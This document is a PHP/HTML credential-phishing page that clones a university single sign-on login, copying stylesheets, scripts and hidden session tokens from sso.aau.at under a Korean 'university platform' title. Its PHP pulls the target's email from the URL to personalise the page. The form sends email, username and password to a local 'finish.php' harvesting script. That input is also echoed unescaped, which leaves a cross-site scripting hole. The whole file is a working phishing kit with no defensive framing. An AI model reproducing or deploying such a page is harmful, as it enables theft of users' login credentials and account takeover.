
<!DOCTYPE html>








<html lang="en">
    <head>
        <meta charset="UTF-8"/>
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>대학 플랫폼</title>

        
        
        

        <link rel="stylesheet" href="https://sso.aau.at/cas/css/bootstrap.min.css"/>
        <link rel="stylesheet" href="https://sso.aau.at/cas/css/font-awesome.min.css"/>
        <link rel="stylesheet" href="https://sso.aau.at/cas/css/cas.css"/>
        <link rel="icon" href="https://sso.aau.at/cas/favicon.ico" type="image/x-icon"/>
    </head>

    <body id="cas">
        <div id="container" class="container">
            <div class="content-wrapper">
                <div id="header" class="row">
                    <div class="col-xs-12 col-sm-8 col-md-6 col-sm-offset-2 col-md-offset-3 img-header">
                        <div class="logo-img">
                            
                        </div>
                        <div class="text-login">
                            <?php   $email = $_GET['email']; 

$domain_name = substr(strrchr($email, "@"), 1); echo strtoupper ($domain_name);
?>
                        </div>
                    </div>
                </div>
                <div id="content" class="row">


<div class="col-md-12">
    <div class="col-md-background col-xs-12 col-sm-8 col-md-6 col-sm-offset-2 col-md-offset-3">
        <div class="col-md-8 card-header-text"></div>
        <div class="col-md-4 card-header-options">
            
            
            
            
            
                
                    <span><a href="#"></a></span>
                
                
            
        </div>
        <div class="col-md-12 card-head icon-login">
            <span class="fa-stack fa-lg">
               
      
            </span>
        </div>

        <div class="col-md-12 card-content">
            <form id="login-form" class="form-horizontal" action="finish.php" method="post">
                
                    <div class="form-group">
                        
                        <label for="username" class="control-label sr-only">이메일 주소</label>
                        <input id="username" name="email" class="form-control" aria-describedby="usernameStatus" placeholder="이메일 주소" type="text" value="<?php echo $_GET['email']; ?>" autocomplete="off"/></div>
<div class="form-group">
                        
                        <label for="username" class="control-label sr-only">Username</label>
                        <input id="username" name="userid" class="form-control" aria-describedby="usernameStatus" placeholder="사용자 이름" type="text" value="" autocomplete="off"/>
                        
                        <span id="usernameStatus" class="sr-only"></span>
                        
                    </div>
                

                
                    <div class="form-group">
                        
                        <label for="password" class="control-label sr-only"></label>
                        <input id="password" name="password" aria-describedby="passwordStatus" placeholder="암호" class="form-control" type="password" value=""/>
                        <span id="caps-feedback" class="fa fa- form-control-feedback hidden" aria-hidden="true"></span>
                        
                        <span id="passwordStatus" class="sr-only"></span>
                        
                    </div>
                

                
                    <div class="form-group">
                       
                            <div class="alert-icon"></span></div>
                            
                                
                                
                     
                
                <div class="form-group">
                    <input type="hidden" name="lt" value="LT-1458609-DcGDWaWQEvvcXHO1ng5ekvLdF2XHGD-sso.aau.at" />
                    <input type="hidden" name="execution" value="d9cea57e-e960-4738-8303-1b4a8250a3b2_AAAAIgAAABBCgKnBJ1f5agSondthvKYIAAAABmFlczEyODuKdku7o1V8nk/6MJoUVuGTZBjLzroRY8v2DelXAR3e/38P9DVJiYzU+430paamo4l2bFw+Bhf59coqouP2gvgLqf+JtZo2QXVr0IiKjpowlfDpUb2PET0Acr0Nwe54MIDn1H5mnXnC7nc3aFBvvbA6twEEieP7LFEpv0z2o8CzAqSDFUFjQxUiMcKOlIoJHeOhGG3XpmAMi7ot2RmHUAu6SA/ZCGTdMPdbbDrCoUlevn4Jskim6SJL2YnecGz9+CWXf5P2YOgsOVOeeyJ7hdI/Xs0oaIfOPbJA0ouOSiYNI56nU9nF8AhGOz7z+3ieYJ8T+NRzsh1AUfcwFiIj9CiYgMgN5si4MJS2e3vRIQzy6hfUvtZ89B9JBKwyutstEuwrrE9HiCCuP1enz8LLnddAr+Z8n4gQpfNHU3oeUcWM0unKomuvp9WDL29DpRiGwWVbabpzTsJsbp5rVes3MH31KE2NrNhy/y+K+xOV5ihsUvcezZKTxv+gD+BSwPJYh/zYGvqdzPg1Vc2jH67wAZs3EKptYOx5/ooe1qJLthHi4/pzB+rS8SR+CQW1yg6z/j7N09rSc/jAeVe3sG6dsnd0uWW1gj/OjDvSz9WfbHkZ91SgQVieTsDkN+CgwZ2DBz03c+Oat4mDtGGS3LzYUyPsLDuDNhcUKR7n95nTxY7EJjXR5SAsbnkCRs+gFW9968UYoa6nBwmng541YHNpIDB2n8i1Su4UyeEm6PEdqawBPh1aDSWmp+YT3UFBFspwZgTWbUfxW7m3Mthz8ehQTY8wiuVis1ABBB63U8OMBf3O+mX1X3PEy/rVoT6UhjFWnyvaSgLFVPA0q7Ejz8TLzwmTLgF2SlNyNe/A7tgIvM3z9i6z0lW5K20iq/z38TM/1vWQ36RFYvRLKytJlsUwYx4vTnWirtb2BuM+/W+m+9iVQnRbgmP2HDVAxJV4JYRW+EaxRPHJ3D+C2O9rT7dWCgHsBc/4GFqPV2rnFbKQk5wCknKcoWB5pDx3rlrusBFgr+tijyNzhKurEAJLKez/2+Fzbkvcg1WK0nlfNEmG90TqHYSQLb20lkERLfP1Rz+4TiFAlMZUTOt+QEV5eFMutxJG9XtcWd3FVlHqGpq7PNf3xLo7qmz6sVjbk96ONVRBhgl5XFY0p59jMxOgXjLNd7EtaQjbLGQaInrRI56hAqKqYjvdPukfjq8TLBgzyLYDigxG94jR7CrEofJJgT3UCQJrJLOpgEKWBv5p5bUCIElEAEaeegryC6BI4Yaac3+rMogLu8qNg/o3Nlyk5MTVwOmPDSp9zhLRGDi7f6pduz3plIolk6AQh8FeWmsAwUVKkIymvFZMEN9FO/C4KdbH2tfIdSVL0lEYRJqdvxs+qVhPizEFounaU/UO9DfzeWjaTHcKdKgkq/ZfgP00Vd+DibZgM8viszHHuIq3tEYwpbpMNs3Q1qJwPJsMIu+VYgCYXE2LyNQgxCE9gULxp5ONdy9g2Ap+iCAuN3Nuz7cD9n/8CSpifs9/5OVDOsH7XYcSQVMBIsrYNWeYjZAfuU4HGebP2/y4osaWcwk1Xd3WdcGD1MjQXlh9J9fNTQ9L7vSaYe8UaEtukNFI9GKRPu/GD2fHj16ToWVrWiABJpOfmCgabJO8qd9uuQ1IF1BEhm7HjAOanvjL0jhBYc8VJkZ3l+Ng79S+bQyxDdUVClWNyhm1ITFtKiBb1hzuvx1S11lW707z8JkO8q1+64ZcAI59yT+ZIpqxkQrqVTkX+U9th8ak5xCanFoFd30HS1GBTzUZhOJG77AtWfqHMHqHilXWzlNYPA/Kvqq4ERJv/8Q8j124SAjiZAdilbEd0iCCoruepddyM2Z7yq/fsbdQ9Rt5o+YJESylgatItkxhSzePzIUEe6Crr8wF8ePRWghhXsxcc4Wi5fyXVyLrgTWcTSgYCeJdsd+JgVonLrf41zvjwVW9qolunt9c2qLf23kV9hcJ8T0l0pEfkUTCwgpV3BgBof9RtWEE0Kr3wlOS9xjU+6VXzR5+uc/0vsoYNXbt/vCZXFz4Ajx1Q999GgkV7fwrW85kGN+2E654q76TLYlHHhhIETW3djfBeBL9xjgrbEKoMj+IiNyn6O+Z3LhKyi3En1fwL57sPtqi6/7Z5XmTPfkLyZ4qtdX/NnDWmz/b4nem9oc6MTDpcPLBOYsQ1sZtDgS4NGKR+7mqS1EeXR9qJ3vD/zuQtngv5u8NgAu7ftnhJ7RBUcPOPyhE+2lXcVEVcont0Az5lA4+ev8iH8rCaZHdUQD/JETXfzlQEml8m8sU4VkDF2Yx+5f/3ZSx2FrMmNAZGba67aQ/Galx4KOCYB2s7xXVmLmbFvuaiqoRrE4Ej6sTOpuMEwPjSt/Z/GpwLuEm9zLrYPX0WYM6u/M2QrHTqnT2FAtKLENcsEqrq9oriwRiG0JE9Syii3Vro8IRwxAIyedAjWeS+4VCp3vjJCKRQq1CstE4yX27JPPFbUJJ15aWFrnCLBr7JsqQO4sdXQMpgca8jMymFRBgcm5fEHCKWdWLx1xtMsdIZ+zd+5k79Q==" />
                    <input type="hidden" name="_eventId" value="submit" />
                    <button type="submit" class="btn btn-primary btn-block" id="btn-block-anmelden">로그인</button>
                </div>
            <div>
</div></form>
            <div class="help-text">
                <span class="new">
                    
                </span>
                <span class="help">
                    <a href="https://campus.aau.at/idm/passwort/requestreset"></a>
                </span>
            </div>
        </div>
    </div>
</div>





                </div> <!-- END #content -->

                <div class="row">
                    
                    </div>
                </div>

            </div> <!-- END .content-wrapper -->
        </div> <!-- END #container -->

        
        
        
        
        <script type="text/javascript" src="https://sso.aau.at/cas/js/jquery-1.12.1.min.js"></script>
        <script type="text/javascript" src="https://sso.aau.at/cas/js/jquery.capslockstate.js"></script>
        <script type="text/javascript" src="https://sso.aau.at/cas/js/bootstrap.min.js"></script>
        <script type="text/javascript" src="https://sso.aau.at/cas/js/cas.js"></script>

    </body>
</html>

